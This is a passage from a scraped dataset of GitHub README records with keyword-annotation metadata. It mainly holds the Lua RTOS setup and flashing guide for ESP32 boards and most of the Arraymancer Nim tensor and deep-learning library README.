modules with other base interfaces.\n\ud83d\udc6a authors\ndue to the large number of existing people having contributed to the success of raspberrymatic, please refer to the contributors accordingly.\n\ud83d\udea7 changelog\na detailed list of changes between individual released versions can be reviewed through the releases section of this github project.", "sortedWord": "None", "removed": "Nan", "score": null, "comments": null, "media": "Nan", "medialink": "Nan", "identifyer": 7000122, "year": null}, {"Unnamed: 0": 123, "autor": 123, "date": null, "content": "What's Lua RTOS?\nLua RTOS is a real-time operating system designed to run on embedded systems, with minimal requirements of FLASH and RAM memory. Currently Lua RTOS is available for ESP32, ESP8266 and PIC32MZ platforms, and can be easilly ported to other 32-bit platforms.\nLua RTOS has a 3-layer design:\nIn the top layer there is a Lua 5.3.4 interpreter which offers to the programmer all the resources provided by the Lua programming language, plus special modules for access the hardware (PIO, ADC, I2C, RTC, etc \u2026), and middleware services provided by Lua RTOS (Lua Threads, LoRa WAN, MQTT, \u2026).\nIn the middle layer there is a Real-Time micro-kernel, powered by FreeRTOS. This is the responsible for that things happen in the expected time.\nIn the bottom layer there is a hardware abstraction layer, which talk directly with the platform hardware.\nFor porting Lua RTOS to other platforms is only necessary to write the code for the bottom layer, because the top and the middle layer are the same for all platforms.\nHow is it programmed?\nThe Lua RTOS compatible boards can be programmed with The Whitecat IDE in two ways: using the Lua programming language directly, or using a block-based programming language that translates blocks to Lua. No matter if you use Lua or blocks, both forms of programming are made from the same programming environment. The programmer can decide, for example, to made a fast prototype using blocks, then change to Lua, and finally back to blocks.\nThe Whitecat IDE is available at: https://ide.whitecatboard.org.\nIn our wiki you have more information about this.\nHow to get the Lua RTOS firmware?\nPrerequisites\nPlease note you need probably to download and install drivers for your board's USB-TO-SERIAL adapter for Windows and Mac OSX versions. The GNU/Linux version usually doesn't need any drivers. This drivers are required for connect to your board through a serial port connection.\nBoard\nWHITECAT ESP32 N1\nESP32 CORE\nESP32 THING\nFor Linux, the currently logged user should have read and write access the sUSB-TO-SERIAL device. On most Linux distributions, this is done by adding the user to dialout group with the following command:\n$ sudo usermod -a -G dialout $USER\nMethod 1: get a precompiled firmware\nInstall The Whitecat Console. The Whitecat Console is a command line tool that allows the programmer to flash a Lua RTOS compatible board with the last available firmware.\nDownload The Whitecat Console binary for your platform.\nUbuntu\nMac OS\nWindows\nCopy The Whitecat Console binary to a folder accessed by the system path. For example:\nUbuntu: sudo cp wcc /usr/bin\nMac OS: sudo cp wcc /usr/bin\nWindows: runas /noprofile /user:Administrator \"copy wcc.exe c:\\windows\\system32\"\nTest that The Whitecat Console binary works well.\nFor Ubuntu / Mac OS open a terminal and type:\n$ wcc\nwcc -p port | -ports [-ls path |\n[-down source destination] | [-up source destination] |\n[-f | -ffs] | [-erase] | -d]\n-ports: list all available serial ports on your computer\n-p port: serial port device, for example /dev/tty.SLAB_USBtoUART\n-ls path: list files present in path\n-down src dst: transfer the source file (board) to destination file (computer)\n-up src dst: transfer the source file (computer) to destination file (board)\n-f: flash board with last firmware\n-ffs: flash board with last filesystem\n-erase: erase flash board\n-d: show debug messages\nFor Windows open a \"command\" window and type wcc.exe\nFind which serial device is used by your board.\nOpen a terminal with your board unplugged.\n$ wcc -ports\nAvailable serial ports on your computer:\n/dev/cu.Bluetooth-Incoming-Port\n/dev/cu.Bluetooth-Modem\nNow plug your board.\n$ wcc -ports\nAvailable serial ports on your computer:\n/dev/cu.Bluetooth-Incoming-Port\n/dev/cu.Bluetooth-Modem\n/dev/cu.SLAB_USBtoUART\nIn the above example, board is using /dev/cu.SLAB_USBtoUART serial device. This device will be used in the following steps as parameter value -p.\nFor windows use wcc.exe instead of wcc.\nFlash your board.\nOpen a terminal with your board plugged.\n$ wcc -p /dev/cu.SLAB_USBtoUART -f\nIf you want to flash the default file system add the -ffs option.\n$ wcc -p /dev/cu.SLAB_USBtoUART -f -ffs\nIf you are flashing the Lua RTOS firmware for first time you will get an error:\nUnknown board model.\nMaybe your firmware is corrupted, or you haven't a valid Lua RTOS firmware installed.\nDo you want to install a valid firmware now [y/n])?\nEnter \"y\" if you want to install a valid firmware:\nPlease, enter your board type:\n1: WHITECAT N1\n2: WHITECAT N1 WITH OTA\n3: ESP32 CORE BOARD\n4: ESP32 CORE BOARD WITH OTA\n5: ESP32 THING\n6: ESP32 THING WITH OTA\n7: GENERIC\n8: GENERIC WITH OTA\nType:\nFinally enter your board type and your board will be flashed.\nFor windows use wcc.exe instead of wcc.\nTo upgrade a board with a Lua RTOS firmware installed on it:\n$ wcc -p /dev/cu.SLAB_USBtoUART -f\nIf you need to change the firmware type on a board with a Lua RTOS firmware installed on it, for example to change an OTA firmware to a non OTA firmware:\n$ wcc -p /dev/cu.SLAB_USBtoUART -erase\n$ wcc -p /dev/cu.SLAB_USBtoUART -f\nMethod 2: build by yourself\nInstall ESP32 toolchain for your desktop platform. Please, follow the instructions provided by ESPRESSIF:\nWindows\nMac OS\nLinux\nClone or pull esp-idf repository from ESPRESSIF:\nIf you are build Lua RTOS for first time, clone the esp-idf repository:\ngit clone --recursive https://github.com/espressif/esp-idf.git\notherwise, pull last esp-idf changes from your esp-idf folder:\ngit pull\ngit submodule update --init --recursive\nClone or pull Lua RTOS repository:\nIf you are building Lua RTOS for first time, clone Lua RTOS repository:\ngit clone --recursive https://github.com/whitecatboard/Lua-RTOS-ESP32\notherwise, pull last Lua RTOS changes from your Lua Lua-RTOS-ESP32 folder:\ngit pull origin master\nSetup the build environment:\nGo to Lua-RTOS-ESP32 folder:\ncd Lua-RTOS-ESP32\nEdit the env file and change PATH, IDF_PATH, LIBRARY_PATH, PKG_CONFIG_PATH, CPATH for fit to your installation locations.\nNow do:\nsource ./env\nBuild:\n$ make flash\nIf you are building Lua RTOS for first time, select your board type, and press enter:\nPlease, enter your board type:\n1: Whitecat N1 ESP32\n2: Whitecat N1 ESP32 with OTA\n3: Whitecat N1 ESP32 DEVKIT\n4: Whitecat N1 ESP32 DEVKIT with OTA\n5: Espressif Systems ESP32-CoreBoard\n6: Espressif Systems ESP32-CoreBoard with OTA\n7: SparkFun ESP32 Thing\n8: SparkFun ESP32 Thing with OTA\nBoard type:\nWhen the Lua RTOS build process finish, the board will be flashed. It is possible that for certain operating systems, or boards, the flashing process fails, due to a not compatible device name for your board's USB-TO-SERIAL adapter. In this case change the default configuration to met your board or operating system requirements, as described above.\nChange the default configuration:\nYou can change the default configuration:\n$ make menuconfig\nCheck the device name for your board's USB-TO-SERIAL adapter under the \"Serial flasher config / Default serial port\" category.\nBuild for other board:\nIf you have already build Lua RTOS previously and want to build for other board type:\n$ make clean\nGo to step 5.\nConnect to the console\nYou can connect to the Lua RTOS console using your favorite terminal emulator program, such as picocom, minicom, hyperterminal, putty, etc ... The connection parameters are:\nspeed: 115200 bauds\ndata bits: 8\nstop bits: 1\nparity: none\nterminal emulation: VT100\nFor example, if you use picocom:\npicocom --baud 115200 /dev/tty.SLAB_USBtoUART\n/\\ /\\\n/ \\_____/ \\\n/_____________\\\nW H I T E C A T\nLua RTOS beta 0.1 build 1479953238 Copyright (C) 2015 - 2017 whitecatboard.org\ncpu ESP32 at 240 Mhz\nspiffs0 start address at 0x180000, size 512 Kb\nspiffs0 mounted\nspi2 at pins sdi=012/sdo=013/sck=014/cs=015\nsd0 is at spi2, pin cs=015\nsd0 type II, size 1943552 kbytes, speed 15 Mhz\nsd0a partition type 0b, sector 227, size 1943438 kbytes\nfat init file system\nfat0 mounted\nredirecting console messages to file system ...\nLua RTOS beta 0.1 powered by Lua 5.3.4\nExecuting /system.lua ...\nExecuting /autorun.lua ...\n/ >\nLua RTOS is free for you, but funds are required for make it possible. Feel free to donate as little or as much as you wish. Every donation is very much appreciated.", "link": "https://github.com/whitecatboard/Lua-RTOS-ESP32", "origin": "Github", "suborigin": "Iot", "result": true, "Selector": "tool", "selectorShort": "tool", "MarkedSent": "what's lua rtos?\nlua rtos is a real-time operating system designed to run on embedded systems, with minimal requirements of flash and ram memory. currently lua rtos is available for esp32, esp8266 and pic32mz platforms, and can be easilly ported to other 32-bit platforms.\nlua rtos has a 3-layer design:\nin the top layer there is a lua 5.3.4 interpreter which offers to the programmer all the resources provided by the lua programming language, plus special modules for access the hardware (pio, adc, i2c, rtc, etc \u2026), and middleware services provided by lua rtos (lua threads, lora wan, mqtt, \u2026).\nin the middle layer there is a real-time micro-kernel, powered by freertos. this is the responsible for that things happen in the expected time.\nin the bottom layer there is a hardware abstraction layer, which talk directly with the platform hardware.\nfor porting lua rtos to other platforms is only necessary to write the code for the bottom layer, because the top and the middle layer are the same for all platforms.\nhow is it programmed?\nthe lua rtos compatible boards can be programmed with the whitecat ide in two ways: using the lua programming language directly, or using a block-based programming language that translates blocks to lua. no matter if you use lua or blocks, both forms of programming are made from the same programming environment. the programmer can decide, for example, to made a fast prototype using blocks, then change to lua, and finally back to blocks.\nthe whitecat ide is available at: https://ide.whitecatboard.org.\nin our wiki you have more information about this.\nhow to get the lua rtos firmware?\nprerequisites\nplease note you need probably to download and install drivers for your board's usb-to-serial adapter for windows and mac osx versions. the gnu/linux version usually doesn't need any drivers. this drivers are required for connect to your board through a serial port connection.\nboard\nwhitecat esp32 n1\nesp32 core\nesp32 thing\nfor linux, the currently logged user should have read and write access the susb-to-serial device. on most linux distributions, this is done by adding the user to dialout group with the following command:\n$ sudo usermod -a -g dialout $user\nmethod 1: get a precompiled firmware\ninstall the whitecat console. the whitecat console is a command line -----> tool !!!  that allows the programmer to flash a lua rtos compatible board with the last available firmware.\ndownload the whitecat console binary for your platform.\nubuntu\nmac os\nwindows\ncopy the whitecat console binary to a folder accessed by the system path. for example:\nubuntu: sudo cp wcc /usr/bin\nmac os: sudo cp wcc /usr/bin\nwindows: runas /noprofile /user:administrator \"copy wcc.exe c:\\windows\\system32\"\ntest that the whitecat console binary works well.\nfor ubuntu / mac os open a terminal and type:\n$ wcc\nwcc -p port | -ports [-ls path |\n[-down source destination] | [-up source destination] |\n[-f | -ffs] | [-erase] | -d]\n-ports: list all available serial ports on your computer\n-p port: serial port device, for example /dev/tty.slab_usbtouart\n-ls path: list files present in path\n-down src dst: transfer the source file (board) to destination file (computer)\n-up src dst: transfer the source file (computer) to destination file (board)\n-f: flash board with last firmware\n-ffs: flash board with last filesystem\n-erase: erase flash board\n-d: show debug messages\nfor windows open a \"command\" window and type wcc.exe\nfind which serial device is used by your board.\nopen a terminal with your board unplugged.\n$ wcc -ports\navailable serial ports on your computer:\n/dev/cu.bluetooth-incoming-port\n/dev/cu.bluetooth-modem\nnow plug your board.\n$ wcc -ports\navailable serial ports on your computer:\n/dev/cu.bluetooth-incoming-port\n/dev/cu.bluetooth-modem\n/dev/cu.slab_usbtouart\nin the above example, board is using /dev/cu.slab_usbtouart serial device. this device will be used in the following steps as parameter value -p.\nfor windows use wcc.exe instead of wcc.\nflash your board.\nopen a terminal with your board plugged.\n$ wcc -p /dev/cu.slab_usbtouart -f\nif you want to flash the default file system add the -ffs option.\n$ wcc -p /dev/cu.slab_usbtouart -f -ffs\nif you are flashing the lua rtos firmware for first time you will get an error:\nunknown board model.\nmaybe your firmware is corrupted, or you haven't a valid lua rtos firmware installed.\ndo you want to install a valid firmware now [y/n])?\nenter \"y\" if you want to install a valid firmware:\nplease, enter your board type:\n1: whitecat n1\n2: whitecat n1 with ota\n3: esp32 core board\n4: esp32 core board with ota\n5: esp32 thing\n6: esp32 thing with ota\n7: generic\n8: generic with ota\ntype:\nfinally enter your board type and your board will be flashed.\nfor windows use wcc.exe instead of wcc.\nto upgrade a board with a lua rtos firmware installed on it:\n$ wcc -p /dev/cu.slab_usbtouart -f\nif you need to change the firmware type on a board with a lua rtos firmware installed on it, for example to change an ota firmware to a non ota firmware:\n$ wcc -p /dev/cu.slab_usbtouart -erase\n$ wcc -p /dev/cu.slab_usbtouart -f\nmethod 2: build by yourself\ninstall esp32 toolchain for your desktop platform. please, follow the instructions provided by espressif:\nwindows\nmac os\nlinux\nclone or pull esp-idf repository from espressif:\nif you are build lua rtos for first time, clone the esp-idf repository:\ngit clone --recursive https://github.com/espressif/esp-idf.git\notherwise, pull last esp-idf changes from your esp-idf folder:\ngit pull\ngit submodule update --init --recursive\nclone or pull lua rtos repository:\nif you are building lua rtos for first time, clone lua rtos repository:\ngit clone --recursive https://github.com/whitecatboard/lua-rtos-esp32\notherwise, pull last lua rtos changes from your lua lua-rtos-esp32 folder:\ngit pull origin master\nsetup the build environment:\ngo to lua-rtos-esp32 folder:\ncd lua-rtos-esp32\nedit the env file and change path, idf_path, library_path, pkg_config_path, cpath for fit to your installation locations.\nnow do:\nsource ./env\nbuild:\n$ make flash\nif you are building lua rtos for first time, select your board type, and press enter:\nplease, enter your board type:\n1: whitecat n1 esp32\n2: whitecat n1 esp32 with ota\n3: whitecat n1 esp32 devkit\n4: whitecat n1 esp32 devkit with ota\n5: espressif systems esp32-coreboard\n6: espressif systems esp32-coreboard with ota\n7: sparkfun esp32 thing\n8: sparkfun esp32 thing with ota\nboard type:\nwhen the lua rtos build process finish, the board will be flashed. it is possible that for certain operating systems, or boards, the flashing process fails, due to a not compatible device name for your board's usb-to-serial adapter. in this case change the default configuration to met your board or operating system requirements, as described above.\nchange the default configuration:\nyou can change the default configuration:\n$ make menuconfig\ncheck the device name for your board's usb-to-serial adapter under the \"serial flasher config / default serial port\" category.\nbuild for other board:\nif you have already build lua rtos previously and want to build for other board type:\n$ make clean\ngo to step 5.\nconnect to the console\nyou can connect to the lua rtos console using your favorite terminal emulator program, such as picocom, minicom, hyperterminal, putty, etc ... the connection parameters are:\nspeed: 115200 bauds\ndata bits: 8\nstop bits: 1\nparity: none\nterminal emulation: vt100\nfor example, if you use picocom:\npicocom --baud 115200 /dev/tty.slab_usbtouart\n/\\ /\\\n/ \\_____/ \\\n/_____________\\\nw h i t e c a t\nlua rtos beta 0.1 build 1479953238 copyright (c) 2015 - 2017 whitecatboard.org\ncpu esp32 at 240 mhz\nspiffs0 start address at 0x180000, size 512 kb\nspiffs0 mounted\nspi2 at pins sdi=012/sdo=013/sck=014/cs=015\nsd0 is at spi2, pin cs=015\nsd0 type ii, size 1943552 kbytes, speed 15 mhz\nsd0a partition type 0b, sector 227, size 1943438 kbytes\nfat init file system\nfat0 mounted\nredirecting console messages to file system ...\nlua rtos beta 0.1 powered by lua 5.3.4\nexecuting /system.lua ...\nexecuting /autorun.lua ...\n/ >\nlua rtos is free for you, but funds are required for make it possible. feel free to donate as little or as much as you wish. every donation is very much appreciated.", "sortedWord": "None", "removed": "Nan", "score": null, "comments": null, "media": "Nan", "medialink": "Nan", "identifyer": 7000123, "year": null}, {"Unnamed: 0": 125, "autor": 125, "date": null, "content": "Arraymancer - A n-dimensional tensor (ndarray) library.\nArraymancer is a tensor (N-dimensional array) project in Nim. The main focus is providing a fast and ergonomic CPU, Cuda and OpenCL ndarray library on which to build a scientific computing ecosystem.\nThe library is inspired by Numpy and PyTorch and targets the following use-cases:\nN-dimensional arrays (tensors) for numerical computing\nmachine learning algorithms (as in Scikit-learn: least squares solvers, PCA and dimensionality reduction, classifiers, regressors and clustering algorithms, cross-validation).\ndeep learning\nThe ndarray component can be used without the machine learning and deep learning component. It can also use the OpenMP, Cuda or OpenCL backends.\nNote: While Nim is compiled and does not offer an interactive REPL yet (like Jupyter), it allows much faster prototyping than C++ due to extremely fast compilation times. Arraymancer compiles in about 5 seconds on my dual-core MacBook.\nPerformance notice on Nim 0.20 & compilation flags\nIn Nim 0.20, the -d:release flag does not disable runtime checks like array bounds-checking anymore. This has a signigicant performance impact (5x slowdown in tight loop).\nCompile with -d:release -d:danger to get the same performance as in 0.19.x.\nReminder of supported compilation flags:\n-d:release: Nim release mode (no stacktraces and debugging information)\n-d:danger: No runtime checks like array bound checking\n-d:openmp: Multithreaded compilation\n-d:mkl: Use MKL, implies openmp\n-d:openblas: Use OpenBLAS\nby default Arraymancer will try to use your default blas.so/blas.dll Archlinux users may have to specify -d:blas=cblas. See nimblas for further configuration.\n-d:cuda: Build with Cuda support\n-d:cudnn: Build with CuDNN support, implies cuda.\nYou might want to tune library paths in nim.cfg after installation for OpenBLAS, MKL and Cuda compilation. The current defaults should work on Mac and Linux.\nShow me some code\nArraymancer tutorial is available here.\nHere is a preview of Arraymancer syntax.\nTensor creation and slicing\nimport math, arraymancer\nconst\nx = @[1, 2, 3, 4, 5]\ny = @[1, 2, 3, 4, 5]\nvar\nvandermonde: seq[seq[int]]\nrow: seq[int]\nvandermonde = newSeq[seq[int]]()\nfor i, xx in x:\nrow = newSeq[int]()\nvandermonde.add(row)\nfor j, yy in y:\nvandermonde[i].add(xx^yy)\nlet foo = vandermonde.toTensor()\necho foo\n# Tensor of shape 5x5 of type \"int\" on backend \"Cpu\"\n# |1 1 1 1 1|\n# |2 4 8 16 32|\n# |3 9 27 81 243|\n# |4 16 64 256 1024|\n# |5 25 125 625 3125|\necho foo[1..2, 3..4] # slice\n# Tensor of shape 2x2 of type \"int\" on backend \"Cpu\"\n# |16 32|\n# |81 243|\nReshaping and concatenation\nimport arraymancer, sequtils\nlet a = toSeq(1..4).toTensor.reshape(2,2)\nlet b = toSeq(5..8).toTensor.reshape(2,2)\nlet c = toSeq(11..16).toTensor\nlet c0 = c.reshape(3,2)\nlet c1 = c.reshape(2,3)\necho concat(a,b,c0, axis = 0)\n# Tensor of shape 7x2 of type \"int\" on backend \"Cpu\"\n# |1 2|\n# |3 4|\n# |5 6|\n# |7 8|\n# |11 12|\n# |13 14|\n# |15 16|\necho concat(a,b,c1, axis = 1)\n# Tensor of shape 2x7 of type \"int\" on backend \"Cpu\"\n# |1 2 5 6 11 12 13|\n# |3 4 7 8 14 15 16|\nBroadcasting\nImage from Scipy\nimport arraymancer\nlet j = [0, 10, 20, 30].toTensor.reshape(4,1)\nlet k = [0, 1, 2].toTensor.reshape(1,3)\necho j +. k\n# Tensor of shape 4x3 of type \"int\" on backend \"Cpu\"\n# |0 1 2|\n# |10 11 12|\n# |20 21 22|\n# |30 31 32|\nA simple two layers neural network\nFrom example 3.\nimport arraymancer, strformat\ndiscard \"\"\"\nA fully-connected ReLU network with one hidden layer, trained to predict y from x\nby minimizing squared Euclidean distance.\n\"\"\"\n# ##################################################################\n# Environment variables\n# N is batch size; D_in is input dimension;\n# H is hidden dimension; D_out is output dimension.\nlet (N, D_in, H, D_out) = (64, 1000, 100, 10)\n# Create the autograd context that will hold the computational graph\nlet ctx = newContext Tensor[float32]\n# Create random Tensors to hold inputs and outputs, and wrap them in Variables.\nlet\nx = ctx.variable(randomTensor[float32](N, D_in, 1'f32))\ny = randomTensor[float32](N, D_out, 1'f32)\n# ##################################################################\n# Define the model.\nnetwork ctx, TwoLayersNet:\nlayers:\nfc1: Linear(D_in, H)\nfc2: Linear(H, D_out)\nforward x:\nx.fc1.relu.fc2\nlet\nmodel = ctx.init(TwoLayersNet)\noptim = model.optimizerSGD(learning_rate = 1e-4'f32)\n# ##################################################################\n# Training\nfor t in 0 ..< 500:\nlet\ny_pred = model.forward(x)\nloss = y_pred.mse_loss(y)\necho &\"Epoch {t}: loss {loss.value[0]}\"\nloss.backprop()\noptim.update()\nTeaser A text generated with Arraymancer's recurrent neural network\nFrom example 6.\nTrained 45 min on my laptop CPU on Shakespeare and producing 4000 characters\nWhter!\nTake's servant seal'd, making uponweed but rascally guess-boot,\nBare them be that been all ingal to me;\nYour play to the see's wife the wrong-pars\nWith child of queer wretchless dreadful cold\nCursters will how your part? I prince!\nThis is time not in a without a tands:\nYou are but foul to this.\nI talk and fellows break my revenges, so, and of the hisod\nAs you lords them or trues salt of the poort.\nROMEO:\nThou hast facted to keep thee, and am speak\nOf them; she's murder'd of your galla?\n# [...] See example 6 for full text generation samples\nTable of Contents\nArraymancer - A n-dimensional tensor (ndarray) library.\nPerformance notice on Nim 0.20 & compilation flags\nShow me some code\nTensor creation and slicing\nReshaping and concatenation\nBroadcasting\nA simple two layers neural network\nTeaser A text generated with Arraymancer's recurrent neural network\nTable of Contents\nInstallation\nFull documentation\nFeatures\nArraymancer as a Deep Learning library\nFizzbuzz with fully-connected layers (also called Dense, Affine or Linear layers)\nHandwritten digit recognition with convolutions\nSequence classification with stacked Recurrent Neural Networks\nTensors on CPU, on Cuda and OpenCL\nWhat's new in Arraymancer v0.5.1 - July 2019\n4 reasons why Arraymancer\nThe Python community is struggling to bring Numpy up-to-speed\nA researcher workflow is a fight against inefficiencies\nCan be distributed almost dependency free\nBridging the gap between deep learning research and production\nSo why Arraymancer ?\nFuture ambitions\nInstallation\nNim is available in some Linux repositories and on Homebrew for macOS.\nI however recommend installing Nim in your user profile via choosenim. Once choosenim installed Nim, you can nimble install arraymancer which will pull the latest arraymancer release and all its dependencies.\nTo install Arraymancer development version you can use nimble install arraymancer@#head.\nArraymancer requires a BLAS and Lapack library.\nOn Windows you can get OpenBLAS and Lapack for Windows.\nOn MacOS, Apple Accelerate Framework is included in all MacOS versions and provides those.\nOn Linux, you can download libopenblas and liblapack through your package manager.\nFull documentation\nDetailed API is available at Arraymancer official documentation. Note: This documentation is only generated for 0.X release. Check the examples folder for the latest devel evolutions.\nFeatures\nFor now Arraymancer is mostly at the multidimensional array stage, in particular Arraymancer offers the following:\nBasic math operations generalized to tensors (sin, cos, ...)\nMatrix algebra primitives: Matrix-Matrix, Matrix-Vector multiplication.\nEasy and efficient slicing including with ranges and steps.\nNo need to worry about \"vectorized\" operations.\nBroadcasting support. Unlike Numpy it is explicit, you just need to use +. instead of +.\nPlenty of reshaping operations: concat, reshape, split, chunk, permute, transpose.\nSupports tensors of up to 6 dimensions. For example a stack of 4 3D RGB minifilms of 10 seconds would be 6 dimensions: [4, 10, 3, 64, 1920, 1080] for [nb_movies, time, colors, depth, height, width]\nCan read and write .csv, Numpy (.npy) and HDF5 files.\nOpenCL and Cuda backed tensors (not as feature packed as CPU tensors at the moment).\nCovariance matrices.\nEigenvalues and Eigenvectors decomposition.\nLeast squares solver.\nK-means and PCA (Principal Component Analysis).\nArraymancer as a Deep Learning library\nDeep learning features can be explored but are considered unstable while I iron out their final interface.\nReminder: The final interface is still work in progress.\nYou can also watch the following animated neural network demo which shows live training via nim-plotly.\nFizzbuzz with fully-connected layers (also called Dense, Affine or Linear layers)\nNeural network definition extracted from example 4.\nconst\nNumDigits = 10\nNumHidden = 100\nlet ctx = newContext Tensor[float32]\nnetwork ctx, FizzBuzzNet:\nlayers:\nhidden: Linear(NumDigits, NumHidden)\noutput: Linear(NumHidden, 4)\nforward x:\nx.hidden.relu.output\nlet model = ctx.init(FizzBuzzNet)\nlet optim = model.optimizerSGD(0.05'f32)\n# ....\necho answer\n# @[\"1\", \"2\", \"fizz\", \"4\", \"buzz\", \"6\", \"7\", \"8\", \"fizz\", \"10\",\n# \"11\", \"12\", \"13\", \"14\", \"15\", \"16\", \"17\", \"fizz\", \"19\", \"buzz\",\n# \"fizz\", \"22\", \"23\", \"24\", \"buzz\", \"26\", \"fizz\", \"28\", \"29\", \"30\",\n# \"31\", \"32\", \"fizz\", \"34\", \"buzz\", \"36\", \"37\", \"38\", \"39\", \"40\",\n# \"41\", \"fizz\", \"43\", \"44\", \"fizzbuzz\", \"46\", \"47\", \"fizz\", \"49\", \"50\",\n# \"fizz\", \"52\",\"53\", \"54\", \"buzz\", \"56\", \"fizz\", \"58\", \"59\", \"fizzbuzz\",\n# \"61\", \"62\", \"63\", \"64\", \"buzz\", \"fizz\", \"67\", \"68\", \"fizz\", \"buzz\",\n# \"71\", \"fizz\", \"73\", \"74\", \"75\", \"76\", \"77\",\"fizz\", \"79\", \"buzz\",\n# \"fizz\", \"82\", \"83\", \"fizz\", \"buzz\", \"86\", \"fizz\", \"88\", \"89\", \"90\",\n# \"91\", \"92\", \"fizz\", \"94\", \"buzz\", \"fizz\", \"97\", \"98\", \"fizz\", \"buzz\"]\nHandwritten digit recognition with convolutions\nNeural network definition extracted from example 2.\nlet ctx = newContext Tensor[float32] # Autograd/neural network graph\nnetwork ctx, DemoNet:\nlayers:\nx: Input([1, 28, 28])\ncv1: Conv2D(x.out_shape, 20, 5, 5)\nmp1: MaxPool2D(cv1.out_shape, (2,2), (0,0), (2,2))\ncv2: Conv2D(mp1.out_shape, 50, 5, 5)\nmp2: MaxPool2D(cv2.out_shape, (2,2), (0,0), (2,2))\nfl: Flatten(mp2.out_shape)\nhidden: Linear(fl.out_shape, 500)\nclassifier: Linear(500, 10)\nforward x:\nx.cv1.relu.mp1.cv2.relu.mp2.fl.hidden.relu.classifier\nlet model = ctx.init(DemoNet)\nlet optim = model.optimizerSGD(learning_rate = 0.01'f32)\n# ...\n# Accuracy over 90% in a couple minutes on a laptop CPU\nSequence classification with stacked Recurrent Neural Networks\nNeural network definition extracted example 5.\nconst\nHiddenSize = 256\nLayers = 4\nBatchSize = 512\nlet ctx = newContext Tensor[float32]\nnetwork ctx, TheGreatSequencer:\nlayers:\n# Note input_shape will only require the number of features in the future\n# Input shape = [seq_len, batch_size, features]\ngru1: GRU([3, Batch_size, 1], HiddenSize, 4) # (input_shape, hidden_size, stacked_layers)\nfc1: Linear(HiddenSize, 32) # 1 classifier per GRU layer\nfc2: Linear(HiddenSize, 32)\nfc3: Linear(HiddenSize, 32)\nfc4: Linear(HiddenSize, 32)\nclassifier: Linear(32 * 4, 3) # Stacking a classifier which learns from the other 4\nforward x, hidden0:\nlet\n(output, hiddenN) = gru1(x, hidden0)\nclf1 = hiddenN[0, _, _].squeeze(0).fc1.relu\nclf2 = hiddenN[1, _, _].squeeze(0).fc2.relu\nclf3 = hiddenN[2, _, _].squeeze(0).fc3.relu\nclf4 = hiddenN[3, _, _].squeeze(0).fc4.relu\n# Concat all\n# Since concat backprop is not implemented we cheat by stacking\n# then flatten\nresult = stack(clf1, clf2, clf3, clf4, axis = 2)\nresult = classifier(result.flatten)\n# Allocate the model\nlet model = ctx.init(TheGreatSequencer)\nlet optim = model.optimizerSGD(0.01'f32)\n# ...\nlet exam = ctx.variable([\n[float32 0.10, 0.20, 0.30], # increasing\n[float32 0.10, 0.90, 0.95], # increasing\n[float32 0.45, 0.50, 0.55], # increasing\n[float32 0.10, 0.30, 0.20], # non-monotonic\n[float32 0.20, 0.10, 0.30], # non-monotonic\n[float32 0.98, 0.97, 0.96], # decreasing\n[float32 0.12, 0.05, 0.01], # decreasing\n[float32 0.95, 0.05, 0.07] # non-monotonic\n# ...\necho answer.unsqueeze(1)\n# Tensor[ex05_sequence_classification_GRU.SeqKind] of shape [8, 1] of type \"SeqKind\" on backend \"Cpu\"\n#  Increasing|\n#  Increasing|\n#  Increasing|\n#  NonMonotonic|\n#  NonMonotonic|\n#  Increasing| <----- Wrong!\n#  Decreasing|\n#  NonMonotonic|\nTensors on CPU, on Cuda and OpenCL\nTensors, CudaTensors and CLTensors do not have the same features implemented yet. Also CudaTensors and CLTensors can only be float32 or float64 while CpuTensors can be integers, string, boolean or any custom object.\nHere is a comparative table of the core features.\nAction Tensor CudaTensor ClTensor\nAccessing tensor properties [x] [x] [x]\nTensor creation [x] by converting a cpu Tensor by converting a cpu Tensor\nAccessing or modifying a single value [x] [] []\nIterating on a Tensor [x] [] []\nSlicing a Tensor [x] [x] [x]\nSlice mutation a[1,_] = 10 [x] [] []\nComparison == [x] [] []\nElement-wise basic operations [x] [x] [x]\nUniversal functions [x] [] []\nAutomatically broadcasted operations [x] [x] [x]\nMatrix-Matrix and Matrix-Vector multiplication [x] [x] [x]\nDisplaying a tensor [x] [x] [x]\nHigher-order functions (map, apply, reduce, fold) [x] internal only internal only\nTransposing [x] [x] []\nConverting to contiguous [x] [x] []\nReshaping [x] [x] []\nExplicit broadcast [x] [x] [x]\nPermuting dimensions [x] [] []\nConcatenating tensors along existing dimension [x] [] []\nSqueezing singleton dimension [x] [x] []\nSlicing + squeezing [x] [] []\nWhat's new in Arraymancer v0.5.1 - July 2019\nThe full changelog is available in changelog.md.\nHere are the highlights:\n0.20.x compatibility\nComplex support\nEinsum\nNaive whitespace tokenizer for NLP\nFix height/width order when reading an image in tensor\nPreview of Laser backend for matrix multiplication without SIMD autodetection (already 5x faster on integer matrix multiplication)\n4 reasons why Arraymancer\nThe Python community is struggling to bring Numpy up-to-speed\nNumba JIT compiler\nDask delayed parallel computation graph\nCython to ease numerical computations in Python\nDue to the GIL shared-memory parallelism (OpenMP) is not possible in pure Python\nUse \"vectorized operations\" (i.e. don't use for loops in Python)\nWhy not use in a single language with all the blocks to build the most efficient scientific computing library with Python ergonomics.\nOpenMP batteries included.\nA researcher workflow is a fight against inefficiencies\nResearchers in a heavy scientific computing domain often have the following workflow: Mathematica/Matlab/Python/R (prototyping) -> C/C++/Fortran (speed, memory)\nWhy not use in a language as productive as Python and as fast as C? Code once, and don't spend months redoing the same thing at a lower level.\nCan be distributed almost dependency free\nArraymancer models can be packaged in a self-contained binary that only depends on a BLAS library like OpenBLAS, MKL or Apple Accelerate (present on all Mac and iOS).\nThis means that there is no need to install a huge library or language ecosystem to use Arraymancer. This also makes it naturally suitable for resource-constrained devices like mobile phones and Raspberry Pi.\nBridging the gap between deep learning research and production\nThe deep learning frameworks are currently in two camps:\nResearch: Theano, Tensorflow, Keras, Torch, PyTorch\nProduction: Caffe, Darknet, (Tensorflow)\nFurthermore, Python preprocessing steps, unless using OpenCV, often needs a custom implementation (think text/speech preprocessing on phones).\nManaging and deploying Python (2.7, 3.5, 3.6) and packages version in a robust manner requires devops-fu (virtualenv, Docker, ...)\nPython data science ecosystem does not run on embedded devices (Nvidia Tegra/drones) or mobile phones, especially preprocessing dependencies.\nTensorflow is supposed to bridge the gap between research and production but its syntax and ergonomics are a pain to work with. Like for researchers, you need to code twice, \"Prototype in Keras, and when you need low-level --> Tensorflow\".\nDeployed models are static, there is no interface to add a new observation/training sample to any framework, what if you want to use a model as a webservice with online learning?\nRelevant XKCD from Apr 